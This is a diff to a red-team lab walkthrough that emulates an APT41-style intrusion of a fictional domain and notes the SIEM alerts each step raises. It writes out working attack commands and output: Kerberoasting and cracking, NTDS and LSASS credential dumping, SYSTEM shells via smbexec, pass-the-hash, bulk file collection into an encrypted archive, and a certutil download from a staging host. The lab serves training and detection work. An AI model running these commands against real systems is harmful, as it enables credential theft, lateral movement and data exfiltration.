@@ -53,6 +53,10 @@ make up
 # First run: ~55 min (Kali build + Vagrant boxes download + Ansible provisioning)
 # Subsequent runs (all cached): ~10 min
 
+# 1b. Day-2+ sessions — lab already provisioned, just resuming
+make resume
+# Starts Docker containers + VMs + re-applies TCP offloading fix (see §TCP note below)
+
 # 2. Verify all services are healthy
 make test
 # Expected: all green — DC01, FS01, WS01, Wazuh, Elastic, Zeek, JNDI
@@ -65,6 +69,14 @@ make shell
 # Open http://localhost:5601 in a browser (Kibana)
 # Navigate to: Security → Alerts
 ```
+
+> **TCP offloading note:** Virtual NICs defer TCP checksum computation to hardware that does not
+> exist in a virtual bridge stack. Linux receives packets with invalid checksums and silently drops
+> them — TCP connections hang, ICMP ping still works (raw sockets bypass the offload path).
+> `setup_routing.sh` (called by `make up` and `make resume`) disables TX checksum offloading on
+> every interface in the data path: the Docker bridge, host-side veths, Kali's `eth1` (via `nsenter`),
+> and web01's `eth1`. Ansible disables it on the Windows NIC2 (`Ethernet 2`) on all three VMs at
+> provisioning time. **If Kali→Windows TCP ever breaks again, run `make resume` to re-apply.**
 
 ---
 
@@ -840,34 +852,36 @@ cat /opt/loot/kerberoast_hashes.txt
 # $krb5tgs$23$*svc_backup$NOVATECH.LOCAL$MSSQLSvc/fs01.novatech.local:1433*$...
 ```
 
-**What `$krb5tgs$23$` means:** Hash type 23 = RC4-HMAC encryption. The DC used RC4 because
-svc_backup doesn't have the `msDS-SupportedEncryptionTypes` attribute set to require AES only.
-RC4 hashes crack much faster than AES-256 (mode 13100 vs 19700 in hashcat).
-
-**Detection signal:** Windows EID 4769 — Kerberos TGS request with `TicketEncryptionType: 0x17`
-(RC4). Pre-configured in this lab's Wazuh rules.
+**Hash type note:** Modern impacket requests AES256 (etype 18) by default when the account supports
+it — even if RC4 is also enabled. This lab produces `$krb5tgs$18$` (AES256). Older tools force
+etype 23 (RC4) which cracks ~100× faster; on modern impacket there is no `-etype` flag, so the
+DC chooses. Detection signal: Windows EID 4769.
 
 ```bash
 [KALI]
-# Crack the hash offline — no further network interaction with the DC
-# -m 13100: Kerberos TGS-REP etype 23 (RC4)
-# /usr/share/wordlists/rockyou.txt: ~14 million common passwords
-# --rules-file best64.rule: apply common transformations (appending numbers, l33tspeak, etc.)
-# -o: write cracked result to file
-hashcat -m 13100 \
+# Ensure rockyou.txt is unzipped (Kali ships it gzipped)
+gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
+
+# Option A: hashcat (requires GPU / OpenCL — NOT available in the Docker container)
+# -m 19700: krb5tgs AES256 (etype 18)   -m 13100: RC4 (etype 23)
+hashcat -m 19700 \
   /opt/loot/kerberoast_hashes.txt \
   /usr/share/wordlists/rockyou.txt \
-  --rules-file /usr/share/hashcat/rules/best64.rule \
   -o /opt/loot/kerberoast_cracked.txt \
   --force
 
-# Show result
-cat /opt/loot/kerberoast_cracked.txt
+# Option B: john (CPU — works in the Kali container without OpenCL)
+# krb5-18 handles AES256 TGS tickets; krb5tgs handles RC4
+john /opt/loot/kerberoast_hashes.txt \
+  --wordlist=/usr/share/wordlists/rockyou.txt \
+  --format=krb5-18
+
+john /opt/loot/kerberoast_hashes.txt --show --format=krb5-18
 ```
 
 **Expected:**
 ```
-$krb5tgs$23$*svc_backup...<full hash>...:Backup_Svc99!
+svc_backup:Backup_Svc99!:NOVATECH.LOCAL:MSSQLSvc/fs01.novatech.local:1433
 ```
 
 **Result: `svc_backup / Backup_Svc99!`**
@@ -905,35 +919,34 @@ SMB  192.168.10.10  445  DC01  [+] novatech.local\svc_backup:Backup_Svc99!
 
 ```bash
 [KALI]
-# Dump all domain hashes via CrackMapExec (handles VSS internally)
-# --ntds: dump NTDS.dit via VSS shadow copy
-# CME saves output to ~/.cme/logs/<hostname>_<ip>_<date>.ntds
-crackmapexec smb 192.168.10.10 \
-  -u svc_backup \
-  -p 'Backup_Svc99!' \
-  --ntds
+# Primary: impacket-secretsdump via DRSUAPI (DCSync-equivalent — no VSS shadow copy needed)
+# svc_backup is local Admin on DC01, which is enough to use DRSUAPI remotely
+impacket-secretsdump novatech.local/svc_backup:'Backup_Svc99!'@192.168.10.10 \
+  > /opt/loot/ntds_dump.txt 2>&1
+cat /opt/loot/ntds_dump.txt | grep -E "^Administrator:|^krbtgt:|^.*jsmith|^.*svc_"
 ```
 
 **Expected output:**
 ```
-SMB  192.168.10.10  445  DC01  [+] novatech.local\svc_backup:Backup_Svc99! (Pwn3d!)
-SMB  192.168.10.10  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a redbull...
-SMB  192.168.10.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM>:::
-SMB  192.168.10.10  445  DC01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB  192.168.10.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::
-SMB  192.168.10.10  445  DC01  novatech.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:<JSMITH_NTLM>:::
-SMB  192.168.10.10  445  DC01  novatech.local\svc_ldap:1104:aad3b435b51404eeaad3b435b51404ee:<SVCLDAP_NTLM>:::
-SMB  192.168.10.10  445  DC01  novatech.local\svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:<SVCBACKUP_NTLM>:::
-SMB  192.168.10.10  445  DC01  [+] NTDS.dit dumped successfully
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM>:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::
+jsmith:1104:aad3b435b51404eeaad3b435b51404ee:<JSMITH_NTLM>:::
+svc_ldap:1105:aad3b435b51404eeaad3b435b51404ee:<SVCLDAP_NTLM>:::
+svc_backup:1106:aad3b435b51404eeaad3b435b51404ee:<SVCBACKUP_NTLM>:::
+DC01$:1001:...
+FS01$:1107:...
+WS01$:1108:...
 ```
+
+> **Alternative — crackmapexec `--ntds`:** CME wraps secretsdump internally. Both methods produce
+> identical output. Use CME if you prefer a unified toolchain: `crackmapexec smb 192.168.10.10 -u svc_backup -p 'Backup_Svc99!' --ntds`
 
 ```bash
 [KALI]
-# CME saves to ~/.cme/logs/ — copy to loot directory
-cp $(ls -t ~/.cme/logs/*.ntds 2>/dev/null | head -1) /opt/loot/ntds_dump.ntds
-
 # Extract Administrator NTLM (field 4, colon-delimited)
-ADMIN_NTLM=$(grep "^Administrator:" /opt/loot/ntds_dump.ntds | cut -d: -f4)
+ADMIN_NTLM=$(grep "^Administrator:" /opt/loot/ntds_dump.txt | cut -d: -f4)
 echo "Administrator NTLM: ${ADMIN_NTLM}"
 
 # Save for Pass-the-Hash in Phase 5
@@ -954,22 +967,28 @@ separate documented APT41 technique worth demonstrating. LSASS holds credentials
 and service logons on the current machine — useful for extracting Kerberos tickets and any plaintext
 credentials if WDigest is re-enabled. Run this after Phase 5.1 (you need a shell on WS01 first).
 
-> Run this after you have a SYSTEM shell on WS01 from Phase 5.1.
+> Run this after you have a SYSTEM shell on WS01 from Phase 5.1 (`impacket-smbexec`).
 
 ```bash
-[WS01 — cmd.exe SYSTEM session via psexec]
+[WS01 — smbexec SYSTEM session]
 # C:\Temp is pre-created by Ansible provisioning
 dir C:\Temp\
 
-# Get the LSASS process ID using tasklist (cmd.exe syntax — no PowerShell needed)
-for /f "tokens=2" %i in ('tasklist /fi "imagename eq lsass.exe" /fo list ^| find "PID"') do set LPID=%i
-echo LSASS PID: %LPID%
+# Windows Defender on Windows 10 22H2 blocks comsvcs.dll MiniDump with "Access is denied"
+# even from SYSTEM. Tamper Protection blocks ALL in-OS disable methods: Set-MpPreference,
+# registry writes via WinRM (even from SYSTEM), and safe-mode WinRM (NTLM stack not loaded).
+# The lab disables Defender OFFLINE during 'make up' by editing the WS01 VMDK SOFTWARE hive
+# directly via qemu-nbd+hivexregedit — Tamper Protection cannot enforce when the OS is off.
+# Verify before the dump:
+powershell -ep bypass -c "(Get-MpComputerStatus).RealTimeProtectionEnabled"
+# Expected: False — if True, run 'make reset && make up' on the host to re-apply the fix.
 
-# Dump LSASS using comsvcs.dll MiniDump
-# rundll32.exe — signed Microsoft binary (LOLBAS: Living Off the Land Binary)
-# C:\Windows\System32\comsvcs.dll — system DLL that exports MiniDump function
-# MiniDump: function name   %LPID%: target process   full: include all memory regions
-rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %LPID% C:\Temp\lsass.dmp full
+# Dump LSASS using comsvcs.dll MiniDump via PowerShell one-liner.
+# Must be a single command: smbexec runs each line in a separate cmd.exe process,
+# so environment variables (set LPID=...) and for /f loops don't persist between commands.
+# PowerShell resolves the PID and triggers MiniDump in one shot.
+# -ep bypass: skip execution policy check   Start-Sleep 3: MiniDump writes asynchronously
+powershell -ep bypass -c "$id=(Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $id C:\Temp\lsass.dmp full; Start-Sleep 3"
 
 # Confirm dump created (should be 30-80 MB)
 dir C:\Temp\lsass.dmp
@@ -986,11 +1005,15 @@ dir C:\Temp\lsass.dmp
 ```
 
 ```bash
-[C2 — Sliver console]
-# Download the dump to Kali for offline analysis
-sliver > use <ws01-session-id>
-sliver (WS01) > download C:\Temp\lsass.dmp /opt/loot/lsass.dmp
-# [*] Downloading C:\Temp\lsass.dmp ... complete
+[KALI]
+# Download the dump from WS01 via smbclient (impacket-smbclient `get` saves to CWD)
+cd /opt/loot
+impacket-smbclient novatech.local/jsmith:'Research#2024'@192.168.10.50
+# In the smbclient prompt:
+#   use C$
+#   cd Temp
+#   get lsass.dmp
+# File lands at /opt/loot/lsass.dmp
 ```
 
 ```bash
@@ -1049,24 +1072,16 @@ SMB  192.168.10.50  445  WS01  [+] novatech.local\jsmith:Research#2024 (Pwn3d!)
 
 ```bash
 [KALI]
-# Get SYSTEM shell on WS01 via Impacket PsExec
-# PsExec: uploads a randomized service binary to ADMIN$, starts it as a Windows service,
-# gives you a SYSTEM shell via a named pipe. Noisy but reliable.
-impacket-psexec novatech.local/jsmith:'Research#2024'@192.168.10.50 cmd.exe
+# Get SYSTEM shell on WS01 via Impacket SmbExec
+# SmbExec: creates a Windows service that runs each command via a batch file written to a
+# temp SMB share. No named pipe back-channel (unlike PsExec) — more reliable in virtualised
+# environments where TCP connections through the bridge can be unstable.
+impacket-smbexec novatech.local/jsmith:'Research#2024'@192.168.10.50
 ```
 
 **Expected:**
 ```
-[*] Requesting shares on 192.168.10.50.....
-[*] Found writable share ADMIN$
-[*] Uploading file aBcDeFgH.exe
-[*] Opening SVCManager on 192.168.10.50.....
-[*] Creating service rAnD on 192.168.10.50.....
-[*] Starting service rAnD.....
-[!] Press help for extra shell commands
-
-Microsoft Windows [Version 10.0.19041.xxx]
-(c) Microsoft Corporation. All rights reserved.
+[!] Launching semi-interactive shell - Careful what you execute
 
 C:\Windows\system32> whoami
 nt authority\system
@@ -1075,11 +1090,17 @@ C:\Windows\system32> hostname
 WS01
 ```
 
+> **PsExec vs SmbExec in this lab:** `impacket-psexec` uploads a service binary and connects
+> back via a named pipe on a *new* TCP connection. In virtualised bridge stacks the second
+> connection sometimes hangs even when the first (SMB negotiate) succeeds. `impacket-smbexec`
+> avoids this by tunnelling I/O through the same SMB share rather than a separate pipe.
+> For the article narrative both represent T1021.002 (SMB/Windows Admin Shares).
+
 > **Now go run Phase 4.3** (LSASS dump) while you have the WS01 shell.
 
 **SIEM alerts fired:**
 - Windows EID 4624 (LogonType 3): NTLM network logon from `192.168.10.5` (Kali on target_net) — **HIGH**
-- Windows EID 4697: Service installed (PsExec randomized service) — **HIGH**
+- Windows EID 4697: Service installed (SmbExec randomized service name) — **HIGH**
 - Sysmon EID 1: Service binary execution — **HIGH**
 
 ### 5.2 WS01 → DC01 via Pass-the-Hash
@@ -1093,29 +1114,32 @@ hash from the NTDS dump in Phase 4.2.
 [KALI]
 ADMIN_NTLM=$(cat /opt/loot/admin_ntlm.txt)
 
-# Confirm Administrator hash is valid across the subnet
+# Confirm Administrator DOMAIN hash is valid across the subnet
 # -H: use NTLM hash instead of password   format: LM_hash:NT_hash
 # The LM hash (aad3b435...) is a dummy — Windows hasn't used LM since Vista
+# NOTE: do NOT use --local-auth — this is the DOMAIN Administrator hash, not a local account
 crackmapexec smb 192.168.10.0/24 \
   -u administrator \
   -H "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
-  --local-auth \
   -x "whoami"
 ```
 
-**Expected — hash works on DC01 and WS01:**
+**Expected — hash works on DC01, FS01, and WS01:**
 ```
 SMB  192.168.10.10  445  DC01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
-SMB  192.168.10.10  445  DC01   [+] whoami: nt authority\system
+SMB  192.168.10.20  445  FS01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
 SMB  192.168.10.50  445  WS01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
 ```
 
 ```bash
 [KALI]
-# Get interactive SYSTEM shell on DC01
-impacket-psexec \
+# Get SYSTEM shell on DC01 via SmbExec (PtH)
+# NOTE: impacket-psexec hangs in this lab — it uploads a service binary then connects back via
+# a named pipe on a new TCP connection; that second connection hangs through the VirtualBox bridge.
+# impacket-smbexec avoids this by tunnelling I/O through the same SMB connection.
+impacket-smbexec \
   -hashes "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
-  novatech.local/administrator@192.168.10.10 cmd.exe
+  novatech.local/administrator@192.168.10.10
 ```
 
 **Expected:**
@@ -1125,13 +1149,11 @@ nt authority\system
 
 C:\Windows\system32> hostname
 DC01
-
-C:\Windows\system32> net user Administrator /domain
-...Account active: Yes
-...Password last set: ...
-...Local Group Memberships: *Administrators
-...Global Group memberships: *Domain Users  *Domain Admins  *Group Policy Creator Owners ...
 ```
+
+> **If smbexec fails on DC01** with `STATUS_OBJECT_NAME_NOT_FOUND` — DC security policy is blocking
+> remote service creation via SCM. The NTDS dump (Phase 4.2) and direct FS01 collection (Phase 6)
+> work without a DC01 shell. Use `impacket-secretsdump` and `impacket-smbclient` from Kali directly.
 
 ### 5.3 WMI for Quiet Remote Execution
 
@@ -1140,13 +1162,19 @@ logs). WMI remote execution uses the existing Windows Management Instrumentation
 no service is created, no binary is uploaded. Still noisy on the wire (DCOM traffic) but generates
 fewer host artifacts.
 
+> **Lab note:** `impacket-wmiexec` uses DCOM (port 135 + dynamic high ports). In this lab the
+> VirtualBox bridge stack causes the dynamic port back-channel to hang — the same underlying issue
+> as psexec. wmiexec is documented here for ATT&CK technique coverage (T1047). Use `impacket-smbexec`
+> for actual execution in the lab.
+
 ```bash
 [KALI]
-# Run commands remotely via WMI — quieter than psexec
+# Run commands remotely via WMI — quieter than psexec (fewer host artifacts)
 # Use plaintext password (known from NTDS) or -hashes for PtH
 impacket-wmiexec \
   novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.50 \
-  "whoami && ipconfig /all && net localgroup Administrators"
+  "whoami"
+# If this hangs — Ctrl+C and use impacket-smbexec instead (see §5.1)
 ```
 
 ---
@@ -1155,85 +1183,64 @@ impacket-wmiexec \
 
 **ATT&CK:** T1005, T1074.001, T1560.001, T1105
 
-**What's happening:** We have SYSTEM on DC01. FS01 holds the crown jewels (clinical trial data,
-manufacturing docs). From DC01 we can mount FS01 shares using Domain Admin credentials, copy
-everything to a local staging directory, and compress it into an encrypted archive for exfiltration.
+**What's happening:** FS01 holds the crown jewels (clinical trial data, manufacturing docs).
+With Domain Admin credentials we access FS01 directly from Kali via SMB — no DC01 shell required.
 
 ```bash
-[DC01 — cmd.exe SYSTEM session]
-# Verify what shares FS01 exposes
-net view \\192.168.10.20
-
-# Expected:
-# Share name   Type  Used as  Comment
-# Research     Disk           Phase III clinical trial data
-# Manufacturing Disk          Synthesis documentation
-# ADMIN$       Disk           Remote Admin
-# C$           Disk           Default share
-# IPC$         IPC            Remote IPC
+[KALI]
+# List FS01 shares — confirms Research and Manufacturing are exposed
+impacket-smbclient novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.20
 ```
 
-```bash
-[DC01]
-# Mount FS01 shares with explicit Domain Admin credentials
-# /user: domain\user syntax   pass the plaintext password
-net use Z: \\192.168.10.20\Research      /user:NOVATECH\Administrator NovaTech_Admin2024!
-net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!
-
-# Confirm mounts
-net use
-# Z:  \\192.168.10.20\Research      OK
-# Y:  \\192.168.10.20\Manufacturing OK
-
-# Browse the data
-dir Z:\ /s /b | findstr /i "trial data formula synthesis patent nda"
-dir Y:\ /s /b
+**In the smbclient prompt:**
 ```
+# shares
+ADMIN$
+C$
+IPC$
+Manufacturing
+Research
+
+# use Research
+# tree .
+# mget *
+
+# use Manufacturing
+# tree .
+# mget *
+```
+
+> `mget *` downloads all files from the current directory to CWD on Kali.
+> Launch smbclient from `/opt/loot/` so files land there automatically.
 
 **Expected on FS01 (provisioned by Ansible):**
 ```
-Z:\clinical_data_record_1.csv
-Z:\clinical_data_record_2.csv
-... (30 records)
-Z:\NDA_filing_2026.pdf
-Y:\synthesis_process_1.docx
-... (15 docs)
+Research\clinical_data_record_1.csv  ... (30 records)
+Research\NDA_filing_2026.pdf
+Manufacturing\synthesis_process_1.docx  ... (15 docs)
 ```
 
 ```bash
-[DC01]
-# Stage all data locally
-mkdir C:\Temp\archive
-mkdir C:\Temp\archive\Research
-mkdir C:\Temp\archive\Manufacturing
-mkdir C:\Temp\archive\SYSVOL
-
-# robocopy — robust file copy, better than xcopy for large trees
-# /E: copy all subdirectories including empty ones
-# /NFL: no file listing in output (quiet)
-# /NDL: no directory listing   /NC: no class   /NJS: no job summary   /NJH: no job header
-robocopy Z:\ C:\Temp\archive\Research      /E /NFL /NDL /NC /NJS /NJH
-robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH
-
-# SYSVOL: may contain Group Policy scripts with hardcoded credentials
-robocopy \\192.168.10.10\SYSVOL C:\Temp\archive\SYSVOL /E /NFL /NDL
-
-# Verify staged data
-dir /s C:\Temp\archive\ | find "File(s)"
+[KALI]
+# Compress collected data for exfiltration
+cd /opt/loot
+zip -r -P "RxPhage2024!" data.zip Research/ Manufacturing/ ntds_dump.txt lsass.dmp
+ls -lh data.zip
 ```
 
-```bash
-[DC01]
-# Download 7za.exe (standalone 7-Zip) from Kali staging via certutil
-# certutil -urlcache -f: use URL caching to fetch a file — documented APT41 LOLBAS technique
-# Uses a signed Windows binary as a downloader — no curl.exe or wget needed
-certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
+> **If DC01 shell is available (via smbexec):** The Windows-side staging path uses `net use` +
+> `robocopy` + `certutil`-downloaded 7-Zip — documented APT41 LOLBAS technique (T1105):
+> ```
+> [DC01]
+> net use Z: \\192.168.10.20\Research      /user:NOVATECH\Administrator NovaTech_Admin2024!
+> net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!
+> robocopy Z:\ C:\Temp\archive\Research      /E /NFL /NDL /NC /NJS /NJH
+> robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH
+> certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
+> C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\
+> ```
 
-# Compress with AES-256 password encryption
-# a: add to archive   -tzip: ZIP format   -p: set password   -mx9: maximum compression
-C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\
-
-# Check final archive size
+```
 dir C:\Temp\data.zip
 ```
 
@@ -1606,17 +1613,18 @@ DISCOVERY
   ldapsearch → svc_backup (SPN, Backup Operators), jsmith (R&D, local admin WS01)
 
 CREDENTIAL ACCESS
-  Kerberoast svc_backup                     → Backup_Svc99!
-  impacket-secretsdump -use-vss (DC01)      → ALL domain NTLM hashes incl. Administrator + krbtgt
-  LSASS dump on WS01 (optional demo)        → jsmith NTLM
+  Kerberoast svc_backup                     → Backup_Svc99! (AES256 ticket; john --format=krb5-18)
+  impacket-secretsdump DRSUAPI (DC01)       → ALL domain NTLM hashes incl. Administrator + krbtgt
+  LSASS dump on WS01 (optional demo)        → jsmith NTLM (download via impacket-smbclient)
 
 LATERAL MOVEMENT
-  jsmith:Research#2024 → WS01 (PsExec SYSTEM)
-  Administrator NTLM   → DC01 (PtH, PsExec SYSTEM)
+  jsmith:Research#2024 → WS01 (SmbExec SYSTEM — smbexec avoids named-pipe back-channel)
+  Administrator NTLM   → DC01 (PtH via secretsdump DRSUAPI; shell via smbexec if DC policy allows)
 
 COLLECTION
-  net use → FS01\Research, FS01\Manufacturing, DC01\SYSVOL
-  certutil + 7za → 2.31 GB encrypted archive (C:\Temp\data.zip)
+  impacket-smbclient (from Kali) → FS01\Research, FS01\Manufacturing (mget *)
+  zip -P → encrypted archive /opt/loot/data.zip
+  (alt: net use + robocopy + certutil/7za from DC01 shell)
 
 EXFILTRATION
   Sliver download (sleep 0) → /opt/loot/dc01_data.zip
